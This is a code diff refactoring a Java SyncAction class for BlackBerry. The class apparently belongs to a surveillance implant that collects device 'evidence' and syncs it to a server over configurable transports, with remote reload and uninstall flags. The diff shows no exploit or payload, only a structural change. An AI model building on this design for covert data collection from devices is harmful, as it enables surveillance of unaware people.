@@ -13,20 +13,22 @@ import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
 import blackberry.AgentManager;
-import blackberry.action.SubAction;
+import blackberry.Trigger;
+import blackberry.action.SubActionMain;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.protocol.ZProtocol;
 import blackberry.action.sync.transport.Transport;
-import blackberry.agent.Module;
 import blackberry.config.ConfAction;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.utils.Check;
 
-public abstract class SyncAction extends SubAction {
+public abstract class SyncAction extends SubActionMain {
+    //#ifdef DEBUG
+    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
+    //#endif
     protected EvidenceCollector logCollector;
     protected AgentManager agentManager;
     // protected Transport[] transports = new Transport[Transport.NUM];
@@ -34,10 +36,6 @@ public abstract class SyncAction extends SubAction {
     protected Protocol protocol;
 
     protected boolean initialized;
-
-    //#ifdef DEBUG
-    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
-    //#endif
 
     public SyncAction(ConfAction conf) {
         super(conf);
@@ -47,11 +45,11 @@ public abstract class SyncAction extends SubAction {
         transports = new Vector();
 
         protocol = new ZProtocol();
-        initialized = parse(confParams);
+        initialized = parse(conf);
         initialized &= initTransport();
     }
 
-    public boolean execute(Event event) {
+    public boolean execute(Trigger trigger) {
         //#ifdef DBC
         Check.requires(protocol != null, "execute: null protocol");
         Check.requires(transports != null, "execute: null transports");
@@ -77,11 +75,6 @@ public abstract class SyncAction extends SubAction {
         }
         //#endif
 
-        wantReload = false;
-        wantUninstall = false;
-
-        agentManager.reStart(Module.AGENT_DEVICE);
-
         boolean ret = false;
 
         for (int i = 0; i < transports.size(); i++) {
@@ -104,8 +97,7 @@ public abstract class SyncAction extends SubAction {
                     //#endif
 
                     ret = protocol.perform();
-                    wantUninstall = protocol.uninstall;
-                    wantReload = protocol.reload;
+
                 } catch (ProtocolException e) {
                     //#ifdef DEBUG
                     debug.error(e);
@@ -140,8 +132,6 @@ public abstract class SyncAction extends SubAction {
 
         return false;
     }
-
-    protected abstract boolean parse(final byte[] confParams);
 
     protected abstract boolean initTransport();
 
